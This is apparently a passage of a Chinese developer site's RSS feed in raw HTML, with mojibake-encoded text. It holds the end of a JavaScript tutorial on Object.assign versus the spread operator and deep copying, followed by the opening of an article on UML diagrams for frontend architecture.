<span class="hljs-keyword">const</span> override = { <span class="hljs-attr">theme</span>: <span class="hljs-string">"light"</span> };

<span class="hljs-comment">// ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥å®ç°é…ç½®åˆå¹¶</span>
<span class="hljs-keyword">const</span> settings1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, defaults, userSettings, override);
<span class="hljs-keyword">const</span> settings2 = { ...defaults, ...userSettings, ...override };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(settings1); <span class="hljs-comment">// { theme: "light", fontSize: 16 }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(settings2); <span class="hljs-comment">// { theme: "light", fontSize: 16 }</span>
</code></pre>
<h3 data-id="heading-6">4. åŸå‹é“¾å’Œä¸å¯æšä¸¾å±æ€§</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> proto = { <span class="hljs-attr">protoProp</span>: <span class="hljs-string">"proto"</span> };
<span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto, {
  <span class="hljs-attr">enumerableProp</span>: { <span class="hljs-attr">value</span>: <span class="hljs-string">"enumerable"</span>, <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">nonEnumerableProp</span>: { <span class="hljs-attr">value</span>: <span class="hljs-string">"non-enumerable"</span>, <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span> }
});

<span class="hljs-comment">// ä¸¤è€…éƒ½ä¸å¤åˆ¶åŸå‹é“¾å±æ€§å’Œä¸å¯æšä¸¾å±æ€§</span>
<span class="hljs-keyword">const</span> copy1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, obj);
<span class="hljs-keyword">const</span> copy2 = { ...obj };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy1); <span class="hljs-comment">// { enumerableProp: "enumerable" }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy2); <span class="hljs-comment">// { enumerableProp: "enumerable" }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy1.<span class="hljs-property">protoProp</span>); <span class="hljs-comment">// undefined</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy2.<span class="hljs-property">protoProp</span>); <span class="hljs-comment">// undefined</span>
</code></pre>
<h3 data-id="heading-7">5. å¯¹æ•°ç»„çš„ä½¿ç”¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦å¯¹æ•°ç»„æ›´è‡ªç„¶</span>
<span class="hljs-keyword">const</span> arr1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> arr2 = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>];

<span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦åˆå¹¶æ•°ç»„</span>
<span class="hljs-keyword">const</span> mergedArr1 = [...arr1, ...arr2];

<span class="hljs-comment">// Object.assign ä¹Ÿå¯ä»¥ç”¨äºæ•°ç»„ï¼Œä½†ä¸å¤ªç›´è§‚</span>
<span class="hljs-keyword">const</span> mergedArr2 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>([], arr1, arr2);
<span class="hljs-comment">// æ³¨æ„ï¼šObject.assignç”¨äºæ•°ç»„æ—¶ï¼Œä¼šæŠŠæ•°ç»„å½“ä½œå¯¹è±¡å¤„ç†</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mergedArr1); <span class="hljs-comment">// [1, 2, 3, 4, 5, 6]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mergedArr2); <span class="hljs-comment">// [1, 2, 3, 4, 5, 6]</span>
</code></pre>
<h3 data-id="heading-8">6. æ€§èƒ½è€ƒè™‘</h3>
<p>åœ¨ç°ä»£ JavaScript å¼•æ“ä¸­ï¼Œæ‰©å±•è¿ç®—ç¬¦é€šå¸¸æ¯”Â <code>Object.assign()</code>Â æ€§èƒ½æ›´å¥½ï¼Œå°¤å…¶æ˜¯åœ¨åˆ›å»ºæ–°å¯¹è±¡æ—¶ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦é€šå¸¸æ›´å¿«</span>
<span class="hljs-keyword">const</span> data = { <span class="hljs-comment">/* å¤§é‡æ•°æ® */</span> };

<span class="hljs-comment">// æ–¹å¼1ï¼šæ‰©å±•è¿ç®—ç¬¦ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">const</span> fastCopy = { ...data };

<span class="hljs-comment">// æ–¹å¼2ï¼šObject.assign</span>
<span class="hljs-keyword">const</span> slowCopy = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, data);
</code></pre>
<h2 data-id="heading-9">å¦‚ä½•å®ç°æ·±æ‹·è´ï¼Ÿ</h2>
<p>å¦‚æœä½ éœ€è¦çœŸæ­£çš„æ·±æ‹·è´ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p>
<h3 data-id="heading-10">1. JSON æ–¹æ³•ï¼ˆæœ‰å±€é™æ€§ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> deepCopy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(original));
<span class="hljs-comment">// ç¼ºç‚¹ï¼šä¸èƒ½å¤åˆ¶å‡½æ•°ã€Symbolã€undefinedã€å¾ªç¯å¼•ç”¨ç­‰</span>
</code></pre>
<h3 data-id="heading-11">2. é€’å½’å‡½æ•°</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span>) <span class="hljs-keyword">return</span> obj;
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj);
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>) <span class="hljs-keyword">return</span> obj.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">deepClone</span>(item));
  
  <span class="hljs-keyword">const</span> cloned = {};
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
      cloned[key] = <span class="hljs-title function_">deepClone</span>(obj[key]);
    }
  }
  <span class="hljs-keyword">return</span> cloned;
}
</code></pre>
<h3 data-id="heading-12">3. ç¬¬ä¸‰æ–¹åº“</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Lodash</span>
<span class="hljs-keyword">const</span> cloned = _.<span class="hljs-title function_">cloneDeep</span>(original);

<span class="hljs-comment">// æˆ–ä½¿ç”¨ç°ä»£æµè§ˆå™¨å†…ç½®çš„APIï¼ˆå®éªŒæ€§ï¼‰</span>
<span class="hljs-keyword">const</span> cloned = <span class="hljs-title function_">structuredClone</span>(original);
</code></pre>
<h2 data-id="heading-13">æœ€ä½³å®è·µå»ºè®®</h2>
<ol>
<li><strong>ä¼˜å…ˆä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦</strong>ï¼Œè¯­æ³•æ›´ç®€æ´ç›´è§‚</li>
<li><strong>æ˜ç¡®çŸ¥é“æ˜¯æµ…æ‹·è´</strong>ï¼Œä¸è¦è¯¯ä»¥ä¸ºæ˜¯æ·±æ‹·è´</li>
<li><strong>éœ€è¦æ·±æ‹·è´æ—¶</strong>ï¼Œæ ¹æ®éœ€æ±‚é€‰æ‹©åˆé€‚çš„æ·±æ‹·è´æ–¹æ¡ˆ</li>
<li><strong>åˆå¹¶é…ç½®æ—¶</strong>ï¼Œåé¢çš„å±æ€§ä¼šè¦†ç›–å‰é¢çš„ï¼ˆä¸¤è€…ç›¸åŒï¼‰</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ¨èï¼šä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦</span>
<span class="hljs-keyword">const</span> config = { ...defaultConfig, ...userConfig, ...overrideConfig };

<span class="hljs-comment">// æˆ–è€…å½“ç›®æ ‡å¯¹è±¡å·²å­˜åœ¨æ—¶ï¼Œä½¿ç”¨Object.assign</span>
<span class="hljs-keyword">const</span> existingObj = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(existingObj, newProps); <span class="hljs-comment">// ä¿®æ”¹ç°æœ‰å¯¹è±¡</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆäºŒï¼‰ï¼šUMLå‰ç«¯å»ºæ¨¡çš„ä¸€èˆ¬æ–¹æ³•å’Œå·¥å…·]]></title>    <link>https://juejin.cn/post/7592410399917457449</link>    <guid>https://juejin.cn/post/7592410399917457449</guid>    <pubDate>2026-01-07T15:14:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592410399917457449" data-draft-id="7592241336288886835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆäºŒï¼‰ï¼šUMLå‰ç«¯å»ºæ¨¡çš„ä¸€èˆ¬æ–¹æ³•å’Œå·¥å…·"/> <meta itemprop="keywords" content="å‰ç«¯,å‰ç«¯æ¡†æ¶,UML"/> <meta itemprop="datePublished" content="2026-01-07T15:14:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ç‹å£®å£®"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆäºŒï¼‰ï¼šUMLå‰ç«¯å»ºæ¨¡çš„ä¸€èˆ¬æ–¹æ³•å’Œå·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ç‹å£®å£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:14:09.000Z" title="Wed Jan 07 2026 15:14:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2a6ac6106ad4aac974c0217a3099838~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768403826&amp;x-signature=GZ5WG9SJkIaw1njJMio%2F3pH4s00%3D" alt="image.png" loading="lazy"/>
å¦‚æœè¯´ <strong>4+1 è§†å›¾æ¨¡å‹</strong> æ˜¯æ¶æ„è®¾è®¡çš„**â€œæ€æƒ³æ¡†æ¶â€ <strong>ï¼ˆæˆ‘ä»¬è¦ç”»å“ªå‡ å¼ å›¾ï¼‰ï¼Œé‚£ä¹ˆ UML (Unified Modeling Language) å°±æ˜¯æ¶æ„è®¾è®¡çš„</strong>â€œé€šç”¨è¯­è¨€â€**ï¼ˆè¿™å‡ å¼ å›¾å…·ä½“æ€ä¹ˆç”»ï¼‰ã€‚</p>
<p>å¾ˆå¤šå‰ç«¯å¼€å‘è€…å¬åˆ° UML ä¼šè§‰å¾—é‚£æ˜¯åç«¯å†™ Java çš„äººæ‰ç”¨çš„ä¸œè¥¿ã€‚å…¶å®ä¸ç„¶ã€‚</p>
<p>å‰ç«¯æ¶æ„å¸ˆå¦‚æœä¸æŒæ¡ UMLï¼Œå°±åƒå»ºç­‘å¸ˆåªä¼šå£è¿°â€œè¿™é‡Œæœ‰ä¸ªæŸ±å­â€ï¼Œå´ç”»ä¸å‡ºç²¾ç¡®çš„å›¾çº¸ã€‚</p>
<p>â€œUML ä¸æ˜¯æ•™æ¡ï¼Œè€Œæ˜¯è®©ä½ çš„è®¾è®¡æ–‡æ¡£èƒ½è¢«å…¨çƒç¨‹åºå‘˜è¯»æ‡‚çš„ Esperantoï¼ˆä¸–ç•Œè¯­ï¼‰ã€‚â€</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[UMLå›¾åˆ†ç±»] --&gt; B[ç»“æ„å›¾]
    A --&gt; C[è¡Œä¸ºå›¾]
    
    B --&gt; B1[ç±»å›¾]
    B --&gt; B2[å¯¹è±¡å›¾]
    B --&gt; B3[ç»„ä»¶å›¾]
    B --&gt; B4[éƒ¨ç½²å›¾]
    B --&gt; B5[åŒ…å›¾]
    
    C --&gt; C1[ç”¨ä¾‹å›¾]
    C --&gt; C2[æ´»åŠ¨å›¾]
    C --&gt; C3[çŠ¶æ€æœºå›¾]
    C --&gt; C4[äº¤äº’å›¾]
    
    C4 --&gt; C4a[æ—¶åºå›¾]
    C4 --&gt; C4b[åä½œå›¾]
    C4 --&gt; C4c[äº¤äº’æ¦‚è§ˆå›¾]
    C4 --&gt; C4d[æ—¶åºå›¾]
</code></pre>
<p>æˆ‘å°†<strong>æŒ‘é€‰æœ€é€‚åˆå‰ç«¯æ¶æ„</strong>çš„ 5 ç§ UML å›¾ï¼Œå¹¶ç»“åˆ Mermaid ä»£ç è¿›è¡Œæ¼”ç¤ºã€‚</p>
<hr/>
<h3 data-id="heading-0">1. ä¸ºä»€ä¹ˆå‰ç«¯éœ€è¦ UMLï¼Ÿ</h3>
